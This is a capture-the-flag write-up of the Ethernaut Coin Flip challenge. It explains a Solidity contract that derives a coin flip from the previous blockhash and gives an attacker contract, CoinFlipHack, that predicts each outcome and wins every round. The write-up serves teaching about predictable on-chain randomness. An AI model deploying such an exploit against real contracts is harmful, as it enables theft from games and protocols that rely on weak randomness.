# Ethernaut Challenge 3 - Coin Flip


## Going through the code

```solidity
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
```
Initially the contract declares these 3 variables. 

- The consecutiveWins is a variable that holds the value of how many coin flips we win continuously. 

- lastHash is a variable to record the hash of the previous block.

- FACTOR is an integer that helps in easing the randomization because randomization is not an easy task to do on the blockchain.


```solidity
  constructor() {
    consecutiveWins = 0;
  }
```
A constructor is an optional function that initializes state variables. In our case, we are initializing consecutiveWins as 0;

```solidity
function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
```

Here comes the main part of the contract code - the function ```flip()```. This is a public function that returns the value true or false. We first have a ```uint256 blockValue = uint256(blockhash(block.number - 1));``` This blockValue is a typecasted blockhash of the previous block on the blockchain.

> blockhash - every block in a blockchain has a unique fingerprint and the blockhash is used for identifying that particular block.
> block.number gives us the current block > if we subtract 1, we are going to the previous block

We check if the hash of the previous block is the same as the current blockValue. If it is, then we revert the transaction.
Else we equate lastHash to the blockValue. 

In order to get the probability of the coinFlip, we are making a formula of the blockValue/FACTOR. This helps in making the  calculation of the randomization easier.

> FACTOR is just an integer that helps in easing the randomization

The bool side checks if the coinFlip is equal to 1. If it is equal to 1, side becomes true else ```side``` becomes ```false```.

Next we see if the side is equal to the __guess_ that is passed. In the case that it is equal, the consecutiveWins variable goes up by 1 and the function is returned as true. Else, the consecutiveWins is reset and becomes 0 and returns the function value as false.


# Solution
In order to override this contract, let's build another contract to hack this. 
I built the following contract on [Remix IDE](https://remix.ethereum.org/)

### CoinFlipHack.sol


```solidity
pragma solidity ^0.8.0;

import "./CoinFlip.sol";

contract CoinFlipHack {
    CoinFlip public hackedContract;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    // _hackedContractAddr = 0xA91C791D56895210967d1ec7a69Fe4b8fc7a910e;

    constructor(address _hackedContractAddr) public {
        hackedContract = CoinFlip(_hackedContractAddr);
    }

    function flip() public returns (bool){
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = uint256(blockValue/FACTOR);
        bool side = coinFlip == 1 ? true : false;
        hackedContract.flip(side);
    }

}
```

So, how is this code overriding the main contract code?

We first import the previous contract by simply making another file copy pasting the code on there and naming it CoinFlip. 

After adding the import statement, let's build our CoinFlipHack smart contract code.
hackedContract is the public variable to represent the original contract.
We are using the same FACTOR from before.

We declare the constructor with the argument __hackedContractAddr__ which is of address type this address is the CoinFlip contract address that we will be deploying at. 

The function flip() has the blockValue same as before and coinFlip is calculated in the same way. However, when we pass the contract with our side variable, what is happening is on the original contract, we are getting a _guess = side and if you recall, in the original contract, we had 

```solidity
    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
 ```
 
 Once we already pass the arguement that side in the contract and the _guess that we pass (that we already know the value of), we are getting a return of true and will always provide the value of true.
 
 Hence, is the solution of the challenge.
 
_If you have any improvements to make to this, feel free to fork and make a pull request._

